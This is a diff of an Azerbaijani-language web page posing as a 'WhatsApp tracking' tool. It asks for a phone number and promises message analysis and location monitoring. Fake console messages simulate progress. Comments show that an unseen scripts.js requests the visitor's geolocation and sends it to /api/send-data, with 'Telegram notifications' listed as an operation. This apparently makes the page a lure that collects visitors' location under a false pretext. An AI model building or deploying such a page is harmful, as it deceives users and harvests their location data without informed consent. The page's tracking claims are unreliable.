@@ -1,113 +1,224 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="az">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WhatsApp Izlenilmesi</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>WhatsApp Izləmə</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Space+Mono&display=swap" rel="stylesheet">
+
   <style>
-    body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background: radial-gradient(circle at center, #111 0%, #000 100%);
-      color: #00e6ff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
+    :root{
+      --bg-1: #062916;
+      --bg-2: #083b20;
+      --card: rgba(255,255,255,0.03);
+      --accent: #25D366; /* WhatsApp green */
+      --muted: #9fbfb0;
+      --glass: rgba(255,255,255,0.03);
+      --text: #eafaf0;
+      --panel-bg: rgba(0,0,0,0.35);
     }
 
-    .container {
-      background: rgba(15, 15, 15, 0.95);
-      padding: 40px;
-      border-radius: 20px;
-      box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
-      text-align: center;
-      width: 360px;
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+      color:var(--text);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:28px;
+      background: radial-gradient(1200px 600px at 10% 10%, rgba(37,211,102,0.06), transparent 5%),
+                  linear-gradient(120deg,var(--bg-1),var(--bg-2));
+      overflow:hidden;
     }
 
-    h1 {
-      color: #00ffff;
-      font-size: 22px;
-      margin-bottom: 10px;
-      letter-spacing: 1px;
-      text-shadow: 0 0 10px #00e6ff;
+    /* subtle animated grid overlay to feel "live" */
+    .grid-overlay{
+      position:fixed;inset:0;pointer-events:none;mix-blend-mode:overlay;opacity:.06;
+      background-image:
+        linear-gradient(transparent 24px, rgba(255,255,255,0.01) 25px),
+        linear-gradient(90deg, transparent 24px, rgba(255,255,255,0.01) 25px);
+      background-size: 50px 50px, 50px 50px;
+      filter: blur(1px);
     }
 
-    p {
-      color: #bbb;
-      font-size: 14px;
-      margin-bottom: 20px;
+    .wrap{
+      width:100%;
+      max-width:1100px;
+      display:grid;
+      grid-template-columns: 420px 1fr;
+      gap:28px;
+      align-items:stretch;
+      z-index:1;
     }
 
-    input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 8px;
-      border: none;
-      margin-bottom: 15px;
-      text-align: center;
-      background: #1a1a1a;
-      color: #00ffff;
-      font-size: 14px;
+    .card {
+      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
+      border-radius:14px;
+      padding:28px;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.45);
+      border:1px solid rgba(255,255,255,0.03);
     }
 
-    button {
-      padding: 10px 20px;
-      border-radius: 8px;
-      border: none;
-      background: linear-gradient(90deg, #00ffff, #0088ff);
-      color: #000;
-      cursor: pointer;
-      font-weight: bold;
-      text-transform: uppercase;
-      transition: 0.3s;
+    .brand {
+      display:flex;
+      gap:14px;
+      align-items:center;
+      margin-bottom:16px;
     }
 
-    button:hover {
-      background: linear-gradient(90deg, #00ffcc, #0066ff);
-      transform: scale(1.05);
+    .whatsapp-badge{
+      width:52px;height:52px;display:flex;align-items:center;justify-content:center;
+      background:linear-gradient(180deg,#ffffff22,#ffffff06);border-radius:12px;border:1px solid rgba(255,255,255,0.04);
+      box-shadow: 0 6px 18px rgba(2,6,23,0.4);
     }
 
-    .progress-container {
-      width: 100%;
-      height: 8px;
-      background: #111;
-      border-radius: 5px;
-      margin: 15px 0;
-      display: none;
+    h1{margin:0;font-size:20px;font-weight:700;color:var(--text)}
+    .subtitle{margin:4px 0 12px;color:var(--muted);font-size:13px}
+
+    .input-row{display:flex;gap:10px;align-items:center;margin-top:8px}
+    input[type="text"]{
+      flex:1;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);
+      background:transparent;font-size:14px;color:var(--text);outline:none;
+      box-shadow: inset 0 -1px 0 rgba(0,0,0,0.2);
+    }
+    input::placeholder{color:#9fbfb0aa}
+
+    button.primary{
+      background:linear-gradient(180deg,var(--accent), #08c25b);border:none;color:#022;padding:10px 16px;border-radius:10px;
+      font-weight:700;cursor:pointer;box-shadow: 0 10px 30px rgba(37,211,102,0.12);
+      transition:transform .12s ease, box-shadow .12s;
+    }
+    button.primary:active{transform:translateY(1px)}
+    .note{font-size:12px;color:var(--muted);margin-top:10px}
+
+    /* Right panel */
+    .panel{
+      display:flex;flex-direction:column;gap:14px;padding:20px;border-radius:14px;
+      background: linear-gradient(180deg, rgba(0,0,0,0.18), rgba(0,0,0,0.14));
+      border:1px solid rgba(255,255,255,0.02);box-shadow: inset 0 1px 0 rgba(255,255,255,0.02);
     }
 
-    .progress-bar {
-      height: 100%;
-      width: 0%;
-      background: #00ffff;
-      border-radius: 5px;
-      transition: width 0.3s;
-      box-shadow: 0 0 10px #00ffff;
-    }
+    .panel .header{display:flex;justify-content:space-between;align-items:center}
+    .panel h3{margin:0;font-size:16px}
+    .status-chip{background:rgba(0,0,0,0.25);padding:6px 10px;border-radius:999px;font-weight:700;color:var(--muted);font-size:13px}
 
-    #status {
-      margin-top: 10px;
-      font-size: 14px;
-      color: #00ffcc;
+    .console{
+      background:linear-gradient(180deg, rgba(0,0,0,0.55), rgba(0,0,0,0.4));
+      color:#dfffe9;border-radius:10px;padding:12px;font-family: 'Space Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, 'Roboto Mono', monospace;
+      font-size:13px;line-height:1.5;height:320px;overflow:auto;border:1px solid rgba(255,255,255,0.03);
+    }
+    .console p{margin:0 0 8px;opacity:0.95}
+    .console p.warn{color:#fff1c4}
+    .console p.ok{color:#bfeeee}
+    .console p.meta{color:#9fbfb0;font-size:12px}
+
+    .info-row{display:flex;gap:12px;align-items:center}
+    .info-col{flex:1;background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.02)}
+    .muted{color:var(--muted);font-size:13px}
+
+    .footer{display:flex;justify-content:space-between;align-items:center;margin-top:auto;color:var(--muted);font-size:12px}
+    .badge{background:rgba(255,255,255,0.02);padding:6px 10px;border-radius:999px;font-weight:700}
+    @media (max-width:980px){
+      .wrap{grid-template-columns:1fr;gap:18px}
+      .console{height:220px}
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Whatsapp Izlenilmesi </h1>
-    <p>Enter Whatsapp Number ✆ </p>
+  <div class="grid-overlay" aria-hidden="true"></div>
 
-    <input type="text" id="videoUrlInput" placeholder="Enter Device ID or Media URL">
-    <button id="analyzeButton">Start Analysis✅</button>
+  <div class="wrap" role="main">
+    <div class="card" aria-labelledby="title">
+      <div class="brand">
+        <div class="whatsapp-badge" aria-hidden="true">
+          <!-- refined WhatsApp-like SVG -->
+          <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <rect width="24" height="24" rx="5" fill="#25D366"/>
+            <path d="M17.6 6.4C16.3 5.1 14.5 4.4 12.6 4.6 9.2 4.9 6.4 7.7 6.1 11.1c-.2 2 .5 3.9 1.9 5.3L6 19.5l3.3-.9c1.4.7 3.1 1 4.6.6 3.4-.6 5.9-3.5 5.9-6.9.1-1.9-.6-3.7-2.1-5.1z" fill="#fff"/>
+          </svg>
+        </div>
+        <div>
+          <h1 id="title">WhatsApp Izləmə</h1>
+          <div class="subtitle">Mesaj analizi · Aktivlik monitorinqi · Lokasiya dəstəyi</div>
+        </div>
+      </div>
 
-    <div class="progress-container" id="progressBarContainer">
-      <div class="progress-bar" id="progressBar"></div>
+      <p class="muted">Nömrəni daxil edin (məs. <code>+994501234567</code>) və "Analiz et" düyməsinə basın.</p>
+
+      <div class="input-row" role="form">
+        <input id="videoUrlInput" type="text" inputmode="tel" placeholder="WhatsApp nömrəsini daxil edin: +994..." aria-label="WhatsApp nömrəsi">
+        <button id="analyzeButton" class="primary" aria-label="Analiz et">Analiz et</button>
+      </div>
+
+      <div class="note">Qeyd: Sayt cihazın lokasiyasını soruşa bilər — bu analiz prosesini daha dəqiq edir.</div>
     </div>
 
-    <p id="status"></p>
+    <div class="panel" aria-live="polite">
+      <div class="header">
+        <h3>Real-time Monitor</h3>
+        <div class="status-chip" id="status">Gözləyir</div>
+      </div>
+
+      <div class="console" id="console" role="log" aria-atomic="false">
+        <!-- logs appended here by scripts.js -->
+      </div>
+
+      <div class="info-row" style="margin-top:12px">
+        <div class="info-col">
+          <div class="muted">Son fəaliyyət</div>
+          <div id="lastAction" style="margin-top:6px">—</div>
+        </div>
+        <div class="info-col">
+          <div class="muted">Əməliyyatlar</div>
+          <div style="margin-top:6px">Lokasiya sorğuları • Nömrə analizləri • Telegram bildirişləri</div>
+        </div>
+      </div>
+
+      <div class="footer">
+        <div class="badge">Secure Node • AZ</div>
+        <div>© 2025</div>
+      </div>
+    </div>
   </div>
 
-  <script src="scripts.js"></script>
+  <!-- Existing scripts.js will handle geolocation and /api/send-data -->
+  <script src="./scripts.js"></script>
+
+  <script>
+    // bridge helpers for scripts.js to call for UI updates
+    (function(){
+      const consoleBox = document.getElementById('console');
+      const statusChip = document.getElementById('status');
+      const lastAction = document.getElementById('lastAction');
+
+      function appendLog(text, level) {
+        const p = document.createElement('p');
+        const time = new Date().toLocaleTimeString();
+        p.innerHTML = `<strong>[${time}]</strong> ${text}`;
+        if (level === 'warn') p.classList.add('warn');
+        if (level === 'ok') p.classList.add('ok');
+        consoleBox.appendChild(p);
+        consoleBox.scrollTop = consoleBox.scrollHeight;
+        lastAction.textContent = text;
+      }
+
+      function setStatus(text) {
+        statusChip.textContent = text;
+      }
+
+      // expose globally for scripts.js to use:
+      window.__appendLog = appendLog;
+      window.__setStatus = setStatus;
+
+      // initial seeds
+      appendLog('Sistem yüklənir — əsas modullar işə düşür...', 'ok');
+      setTimeout(()=> appendLog('Şifrələmə qatları və şəbəkə modulu yoxlanıldı', 'ok'), 800);
+      setTimeout(()=> appendLog('Geolocation moduluna hazırlıq — istifadəçinin icazəsi tələb oluna bilər', 'ok'), 1400);
+      setTimeout(()=> window.__setStatus('Gözləyir'), 1600);
+    })();
+  </script>
 </body>
 </html>
